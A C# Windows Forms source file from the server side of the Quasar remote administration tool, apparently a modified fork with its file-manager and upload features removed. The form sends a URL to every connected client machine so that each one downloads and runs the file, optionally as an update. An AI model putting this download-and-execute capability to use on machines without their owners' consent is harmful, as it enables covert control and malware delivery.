using Quasar.Common.Messages;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
// FileTransfer model and FileManagerHandler removed
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmRemoteExecution : Form
    {
        private class RemoteExecutionMessageHandler
        {
            // FileManagerHandler removed as part of file manager functionality removal
            public TaskManagerHandler TaskHandler;
        }

        /// <summary>
        /// The clients which can be used for the remote execution.
        /// </summary>
        private readonly Client[] _clients;

        private readonly List<RemoteExecutionMessageHandler> _remoteExecutionMessageHandlers;

        private enum TransferColumn
        {
            Client,
            Status
        }

        private bool _isUpdate;

        public FrmRemoteExecution(Client[] clients)
        {
            _clients = clients;
            _remoteExecutionMessageHandlers = new List<RemoteExecutionMessageHandler>(clients.Length);

            InitializeComponent();

            foreach (var client in clients)
            {
                var remoteExecutionMessageHandler = new RemoteExecutionMessageHandler
                {
                    // FileManagerHandler removed as part of file manager functionality removal
                    TaskHandler = new TaskManagerHandler(client)
                };

                var lvi = new ListViewItem(new[]
                {
                    $"{client.Value.Username}@{client.Value.PcName} [{client.EndPoint.Address}:{client.EndPoint.Port}]",
                    "Waiting..."
                }) {Tag = remoteExecutionMessageHandler};

                lstTransfers.Items.Add(lvi);
                _remoteExecutionMessageHandlers.Add(remoteExecutionMessageHandler);
                RegisterMessageHandler(remoteExecutionMessageHandler);
            }
        }

        /// <summary>
        /// Registers the message handlers for client communication.
        /// </summary>
        private void RegisterMessageHandler(RemoteExecutionMessageHandler remoteExecutionMessageHandler)
        {
            // TODO handle disconnects
            remoteExecutionMessageHandler.TaskHandler.ProcessActionPerformed += ProcessActionPerformed;
            // File manager functionality has been removed
            MessageHandler.Register(remoteExecutionMessageHandler.TaskHandler);
        }

        /// <summary>
        /// Unregisters the message handlers.
        /// </summary>
        private void UnregisterMessageHandler(RemoteExecutionMessageHandler remoteExecutionMessageHandler)
        {
            MessageHandler.Unregister(remoteExecutionMessageHandler.TaskHandler);
            // File manager functionality has been removed
            remoteExecutionMessageHandler.TaskHandler.ProcessActionPerformed -= ProcessActionPerformed;
        }

        private void FrmRemoteExecution_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Execution", _clients.Length);
        }

        private void FrmRemoteExecution_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (var handler in _remoteExecutionMessageHandlers)
            {
                UnregisterMessageHandler(handler);
                // File manager functionality has been removed
            }

            _remoteExecutionMessageHandlers.Clear();
            lstTransfers.Items.Clear();
        }

        private void btnExecute_Click(object sender, EventArgs e)
        {
            _isUpdate = chkUpdate.Checked;

            if (radioURL.Checked)
            {
                foreach (var handler in _remoteExecutionMessageHandlers)
                {
                    if (!txtURL.Text.StartsWith("http"))
                        txtURL.Text = "http://" + txtURL.Text;

                    handler.TaskHandler.StartProcessFromWeb(txtURL.Text, _isUpdate);
                }
            }
            else
            {
                // File upload functionality has been removed as part of file manager removal
                MessageBox.Show("File upload functionality has been removed.", "Feature Removed", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Multiselect = false;
                ofd.Filter = "Executable (*.exe)|*.exe";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtPath.Text = Path.Combine(ofd.InitialDirectory, ofd.FileName);
                }
            }
        }

        private void radioLocalFile_CheckedChanged(object sender, EventArgs e)
        {
            groupLocalFile.Enabled = radioLocalFile.Checked;
            groupURL.Enabled = !radioLocalFile.Checked;
        }

        private void radioURL_CheckedChanged(object sender, EventArgs e)
        {
            groupLocalFile.Enabled = !radioURL.Checked;
            groupURL.Enabled = radioURL.Checked;
        }

        // FileTransferUpdated method removed as part of file manager functionality removal

        // TODO: update documentation
        /// <summary>
        /// Sets the status message in the transfers list.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="message">The new status.</param>
        private void SetStatusMessage(object sender, string message)
        {
            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;

                if (handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int) TransferColumn.Status].Text = message;
                    return;
                }
            }
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            if (action != ProcessAction.Start) return;

            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;

                if (handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = result ? "Successfully started process" : "Failed to start process";
                    return;
                }
            }
        }
    }
}
